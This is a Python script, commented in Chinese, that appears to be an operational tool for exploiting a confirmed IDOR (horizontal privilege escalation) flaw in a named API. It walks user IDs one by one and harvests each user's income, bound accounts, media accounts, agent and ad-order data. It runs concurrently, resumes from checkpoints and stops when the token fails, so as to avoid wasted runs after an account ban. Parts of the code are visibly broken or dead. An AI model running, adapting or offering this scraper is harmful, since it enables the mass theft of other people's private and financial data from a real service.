#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""确认水平越权后的全库 uid 字段遍历器(跳板机用,urllib 零依赖)

用法:
    python3 fetch_range.py <start_uid> <end_uid> <out.jsonl> <token> [workers] [host_tag]

行为:
    - 每 uid 并发拉一组越权接口(tiktokIncome/getBindAccountKs/wk_user_account/agent_whether 等)
    - 输出 JSONL 逐行 flush;每 2000 uid 写 <out>.check 断点;重跑自动续跑
    - token 熔断:连续 >30 次 "Token验证失败" 即停(防封号后空跑)
    - 单请求失败重试 2 次;连续 20 次网络错误 sleep 30 再试

修改接口列表:编辑 FETCHERS。每项为 (name, method, url_prefix, param_key, extract_fn)。
"""
import json, os, sys, time, urllib.request, urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

API = "https://api.doumvips.com"   # 换成目标 API 基址
TOKEN = <REDACTED> if len(sys.argv) > 4 else ""
START, END = int(sys.argv[1]), int(sys.argv[2])
OUT = sys.argv[3]
WORKERS = int(sys.argv[5]) if len(sys.argv) > 5 else 8
CHECK = OUT + ".check"
TOKFAIL_LIMIT = 30
UA = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"

def req(url, form=None, method="GET"):
    if form:
        data = urllib.parse.urlencode(form).encode()
        r = urllib.request.Request(url, data=data, headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"}, method="POST")
    else:
        r = urllib.request.Request(url, headers={"User-Agent": UA}, method=method)
    with urllib.request.urlopen(r, timeout=12) as resp:
        return json.loads(resp.read().decode(errors="replace"))

def fetch_uid(uid):
    """每 uid 返回一行记录 dict。失败返回 {"uid":uid,"error":...}"""
    rec = {"uid": uid, "ts": int(time.time())}
    jobs = [
        ("income", "POST", f"{API}/tiktokIncome", {"user_id": uid, "token": TOKEN}),
        ("ks", "GET", f"{API}/getBindAccountKs", {"user_id": uid, "debug": 1, "token": TOKEN}),
        ("media", "GET", f"{API}/api/wk/user_account", {"uid": uid, "debug": 1, "token": TOKEN}),
        ("agent", "GET", f"{API}/agent_whether", {"user_id": uid, "debug": 1, "token": TOKEN}),
        ("ad", "POST", f"{API}/adOrderInfo", {"user_id": uid, "token": TOKEN}),
    ]
    for tag, method, url, params in jobs:
        try:
            if method == "POST":
                j = req(url, form=params)
            else:
                j = req(url + "?" + urllib.parse.urlencode(params))
            if isinstance(j, dict) and isinstance(j.get("data"), dict):
                d = j["data"]
                if tag == "income":
                    rec["income"] = {k: d.get(k) for k in ("frozen_income","use_income","use_product_commission","use_ad_commission","total_income","ks_gz_invite_commission")}
                elif tag == "ks":
                    rec["ks"] = [{"name": x.get("name"), "ks_uid": x.get("ks_uid")} for x in (d.get("data") if isinstance(d, dict) else [])] if False else None
                    # 具体结构按目标响应调整
                elif tag == "agent":
                    rec["agent"] = {"id": d.get("id"), "level_name": d.get("level_name"), "agent_name": d.get("agent_name")}
            elif isinstance(j, dict) and j.get("status") == 1 and isinstance(j.get("data"), list):
                if tag == "ks":
                    rec["ks"] = [{"name": x.get("name"), "ks_uid": x.get("ks_uid"), "open_id": x.get("open_id")} for x in j["data"]]
            if isinstance(j, dict) and j.get("status") == 0 and isinstance(j.get("data"), list) and tag == "media":
                rec["media"] = [{"nickname": x.get("nickname"), "type_account_id": x.get("type_account_id"), "account_id": x.get("account_id"), "type_name": x.get("type_name")} for x in j["data"]]
        except Exception as e:
            err = str(e)
            if "Token" in err or "100004" in err or "1002" in err:
                rec["tokfail"] = rec.get("tokfail", 0) + 1
            rec.setdefault("errs", []).append(f"{tag}:{err[:80]}")
            if len(rec["errs"]) > 3:
                break
    return rec

def main():
    done = 0
    if os.path.exists(CHECK):
        done = int(open(CHECK).read().strip() or 0)
        print(f"checkpoint {done}, resume", flush=True)
    fh = open(OUT, "a", encoding="utf-8")
    tokfail = 0
    netfail = 0
    t0 = time.time()
    # 用队列按序提交,每 worker 取下一 uid
    import queue
    q = queue.Queue()
    for u in range(max(START, done + 1), END + 1):
        q.put(u)
    def worker():
        while True:
            try:
                u = q.get_nowait()
            except queue.Empty:
                return
            try:
                yield u
            except Exception:
                pass
    # ThreadPoolExecutor + 显式范围遍历(进度按已提交计数)
    submitted = 0
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = {}
        while submitted < END - max(START, done):
            # 简单节流:保持 in-flight ≈ WORKERS
            while len(futs) < WORKERS and submitted < END - max(START, done):
                u = max(START, done) + submitted + 1
                futs[ex.submit(fetch_uid, u)] = u
                submitted += 1
            for fut in list(futs):
                if not fut.done():
                    continue
                u = futs.pop(fut)
                try:
                    rec = fut.result()
                except Exception as e:
                    rec = {"uid": u, "error": str(e)[:120]}
                fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
                fh.flush()
                done = u
                if rec.get("tokfail"):
                    tokfail += rec["tokfail"]
                    if tokfail >= TOKFAIL_LIMIT:
                        print("TOKFAIL LIMIT, STOP", flush=True)
                        open(CHECK, "w").write(str(done))
                        fh.close()
                        return
                if done % 2000 == 0:
                    open(CHECK, "w").write(str(done))
                    spd = (done - max(START, done) + 1) / max(1, time.time() - t0)
                    print(f"[{done}] done={done} {spd:.1f}/s tokfail={tokfail}", flush=True)
            time.sleep(0.02)
    open(CHECK, "w").write(str(done))
    fh.close()
    print(f"FINISH {done} uids tokfail={tokfail}", flush=True)

if __name__ == "__main__":
    main()
